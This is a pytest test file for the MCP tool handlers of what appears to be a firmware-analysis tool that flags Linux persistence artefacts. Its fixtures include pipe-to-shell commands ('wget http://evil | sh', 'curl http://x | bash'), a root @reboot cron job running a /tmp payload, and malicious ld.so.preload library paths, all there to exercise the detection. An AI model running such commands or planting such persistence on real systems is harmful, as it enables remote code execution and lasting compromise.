"""Coverage for app.ai.tools.linux_persistence MCP handlers."""
from __future__ import annotations

import json
import uuid
from dataclasses import dataclass
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from sqlalchemy.ext.asyncio import AsyncSession

from app.ai.tool_registry import ToolRegistry
from app.ai.tools.linux_persistence import (
    _artefact_config,
    _handle_linux_persistence_walk_status,
    _handle_list_linux_persistence_entries,
    _handle_lookup_linux_persistence_across_firmwares,
    _handle_lookup_linux_persistence_entry,
    _handle_trigger_linux_persistence_walk,
    _row_has_suspicious,
    _row_summary,
    _truncate,
    register_linux_persistence_tools,
)
from app.models import Firmware, Project
from app.models.linux_bash_history_entries import LinuxBashHistoryEntry
from app.models.linux_cron_jobs import LinuxCronJob
from app.models.linux_ld_preload_entries import LinuxLdPreloadEntry
from tests._live_db import make_live_db


@dataclass
class _Ctx:
    db: AsyncSession
    firmware_id: uuid.UUID
    project_id: uuid.UUID | None = None
    extracted_path: str | None = "/tmp/x"

    def resolve_path(self, path: str) -> str:
        return f"{self.extracted_path}/{path.lstrip('/')}"


@pytest.fixture
async def live_db():
    async with make_live_db() as db:
        yield db


async def _seed(db: AsyncSession) -> tuple[Project, Firmware]:
    project = Project(id=uuid.uuid4(), name="persist-tools", status="ready")
    db.add(project)
    await db.flush()
    fw = Firmware(
        id=uuid.uuid4(),
        project_id=project.id,
        sha256="c" * 64,
        extracted_path="/tmp/x",
        extraction_dir="/tmp/x",
        original_filename="fw.bin",
        version_label="v1",
        persistence_walk_status="idle",
    )
    db.add(fw)
    await db.flush()
    return project, fw


def test_register_and_helpers():
    r = ToolRegistry()
    register_linux_persistence_tools(r)
    assert len(r._tools) >= 5
    assert _artefact_config("bash_history")["model"] is LinuxBashHistoryEntry
    assert _artefact_config("cron")["model"] is LinuxCronJob
    assert _artefact_config("ld_preload")["model"] is LinuxLdPreloadEntry
    assert _artefact_config("nope") == {}
    assert "truncated" in _truncate("x" * 40_000)
    assert _truncate("short") == "short"


def test_row_summary_and_suspicious():
    rec = type("R", (), {})()
    rec.id = uuid.uuid4()
    rec.source_file = "/root/.bash_history"
    rec.line_number = 1
    rec.command = "wget http://evil | sh"
    rec.suspicious_flags = {
        "schema_version": 1,
        "clear_marker": False,
        "download_pattern": True,
        "priv_esc_pattern": False,
    }
    cfg = _artefact_config("bash_history")
    assert _row_has_suspicious(rec, cfg["suspicious_bits"], cfg["normalize_flags"])
    s = _row_summary(rec, "bash_history")
    assert s["command"] == rec.command
    assert s["has_suspicious"] is True

    cron = type("C", (), {})()
    cron.id = uuid.uuid4()
    cron.source_file = "/etc/crontab"
    cron.line_number = 2
    cron.schedule_spec = "@reboot"
    cron.user = "root"
    cron.command = "/tmp/payload"
    cron.suspicious_flags = {
        "schema_version": 1,
        "temp_path_command": True,
        "reboot_persistence": True,
        "network_egress_pattern": False,
    }
    cs = _row_summary(cron, "cron")
    assert cs["schedule_spec"] == "@reboot"

    ld = type("L", (), {})()
    ld.id = uuid.uuid4()
    ld.source_file = "/etc/ld.so.preload"
    ld.line_number = 1
    ld.library_path = "/tmp/evil.so"
    ld.suspicious_flags = {
        "schema_version": 1,
        "temp_path_library": True,
        "unusual_extension": False,
        "world_writable_dir": False,
    }
    ls = _row_summary(ld, "ld_preload")
    assert ls["library_path"] == "/tmp/evil.so"


@pytest.mark.asyncio
async def test_list_lookup_status_trigger(live_db):
    project, fw = await _seed(live_db)
    ctx = _Ctx(db=live_db, firmware_id=fw.id, project_id=project.id)

    # seed rows
    live_db.add(
        LinuxBashHistoryEntry(
            firmware_id=fw.id,
            source_file="/root/.bash_history",
            line_number=1,
            command="curl http://x | bash",
            suspicious_flags={
                "schema_version": 1,
                "clear_marker": False,
                "download_pattern": True,
                "priv_esc_pattern": False,
            },
        )
    )
    live_db.add(
        LinuxBashHistoryEntry(
            firmware_id=fw.id,
            source_file="/root/.bash_history",
            line_number=2,
            command="ls -la",
            suspicious_flags={
                "schema_version": 1,
                "clear_marker": False,
                "download_pattern": False,
                "priv_esc_pattern": False,
            },
        )
    )
    live_db.add(
        LinuxCronJob(
            firmware_id=fw.id,
            source_file="/etc/crontab",
            line_number=1,
            schedule_spec="@reboot",
            user="root",
            command="/tmp/a.sh",
            suspicious_flags={
                "schema_version": 1,
                "temp_path_command": True,
                "reboot_persistence": True,
                "network_egress_pattern": False,
            },
        )
    )
    live_db.add(
        LinuxLdPreloadEntry(
            firmware_id=fw.id,
            source_file="/etc/ld.so.preload",
            line_number=1,
            library_path="/lib/evil.so",
            suspicious_flags={
                "schema_version": 1,
                "temp_path_library": False,
                "unusual_extension": False,
                "world_writable_dir": False,
            },
        )
    )
    await live_db.flush()

    bad = await _handle_list_linux_persistence_entries({"artefact_type": "nope"}, ctx)
    assert "error" in bad

    listed = json.loads(
        await _handle_list_linux_persistence_entries(
            {"artefact_type": "bash_history", "limit": 10}, ctx,
        )
    )
    assert listed["total_count"] >= 2
    assert listed["entries"]

    sus = json.loads(
        await _handle_list_linux_persistence_entries(
            {"artefact_type": "bash_history", "suspicious_only": True}, ctx,
        )
    )
    assert sus["total_count"] >= 1

    bit = json.loads(
        await _handle_list_linux_persistence_entries(
            {
                "artefact_type": "bash_history",
                "suspicious_bit": "download_pattern",
                "path_substring": "curl",
                "limit": 5000,  # clamp
                "offset": -1,
            },
            ctx,
        )
    )
    assert bit["limit"] == 500
    assert bit["offset"] == 0

    cron_list = json.loads(
        await _handle_list_linux_persistence_entries(
            {"artefact_type": "cron"}, ctx,
        )
    )
    assert cron_list["total_count"] >= 1

    # empty type
    empty = json.loads(
        await _handle_list_linux_persistence_entries(
            {"artefact_type": "bash_history", "path_substring": "ZZZNOMATCH"}, ctx,
        )
    )
    assert empty["total_count"] == 0
    assert "message" in empty

    # lookup
    assert "error" in await _handle_lookup_linux_persistence_entry(
        {"artefact_type": "bash_history"}, ctx,
    )
    hit = json.loads(
        await _handle_lookup_linux_persistence_entry(
            {"artefact_type": "bash_history", "query": "curl"}, ctx,
        )
    )
    assert hit["match_count"] >= 1
    miss = json.loads(
        await _handle_lookup_linux_persistence_entry(
            {"artefact_type": "ld_preload", "query": "nomatch"}, ctx,
        )
    )
    assert miss["match_count"] == 0

    # cross-firmware
    assert "error" in await _handle_lookup_linux_persistence_across_firmwares(
        {"artefact_type": "bash_history"}, ctx,
    )
    cross = json.loads(
        await _handle_lookup_linux_persistence_across_firmwares(
            {"artefact_type": "bash_history", "query": "curl", "scope": "project"},
            ctx,
        )
    )
    assert cross["match_count"] >= 1

    # second firmware for supply-chain signal
    fw2 = Firmware(
        id=uuid.uuid4(),
        project_id=project.id,
        sha256="d" * 64,
        extracted_path="/tmp/y",
        extraction_dir="/tmp/y",
        original_filename="fw2.bin",
        persistence_walk_status="completed",
    )
    live_db.add(fw2)
    await live_db.flush()
    live_db.add(
        LinuxBashHistoryEntry(
            firmware_id=fw2.id,
            source_file="/root/.bash_history",
            line_number=1,
            command="curl http://x | bash",
            suspicious_flags={
                "schema_version": 1,
                "clear_marker": False,
                "download_pattern": True,
                "priv_esc_pattern": False,
            },
        )
    )
    await live_db.flush()
    cross2 = json.loads(
        await _handle_lookup_linux_persistence_across_firmwares(
            {
                "artefact_type": "bash_history",
                "query": "curl",
                "scope": "project",
                "limit": 1000,
            },
            ctx,
        )
    )
    assert cross2["match_count"] >= 2
    assert "cross_firmware_signal" in cross2

    global_scope = json.loads(
        await _handle_lookup_linux_persistence_across_firmwares(
            {"artefact_type": "cron", "query": "tmp", "scope": "global"},
            ctx,
        )
    )
    assert "matches" in global_scope

    # status
    st = json.loads(await _handle_linux_persistence_walk_status({}, ctx))
    assert st["status"] == "idle"

    missing_fw = _Ctx(db=live_db, firmware_id=uuid.uuid4(), project_id=project.id)
    assert "not found" in await _handle_linux_persistence_walk_status({}, missing_fw)

    # trigger
    with patch(
        "app.services.linux_persistence_walker.run_linux_persistence_walk_background",
        new=AsyncMock(),
    ):
        with patch("asyncio.create_task") as ct:
            ct.side_effect = lambda coro: (
                coro.close() if hasattr(coro, "close") else None
            ) or MagicMock()
            trig = json.loads(await _handle_trigger_linux_persistence_walk({}, ctx))
            assert trig.get("scheduled") is True or trig.get("status") == "queued"

    # conflict when already queued
    fw.persistence_walk_status = "queued"
    await live_db.flush()
    conflict = json.loads(await _handle_trigger_linux_persistence_walk({}, ctx))
    assert conflict.get("conflict") is True

    assert "not found" in await _handle_trigger_linux_persistence_walk({}, missing_fw)


@pytest.mark.asyncio
async def test_cross_firmware_project_scope_requires_project(live_db):
    project, fw = await _seed(live_db)
    ctx = _Ctx(db=live_db, firmware_id=fw.id, project_id=None)
    out = json.loads(
        await _handle_lookup_linux_persistence_across_firmwares(
            {"artefact_type": "bash_history", "query": "x", "scope": "project"},
            ctx,
        )
    )
    assert "error" in out
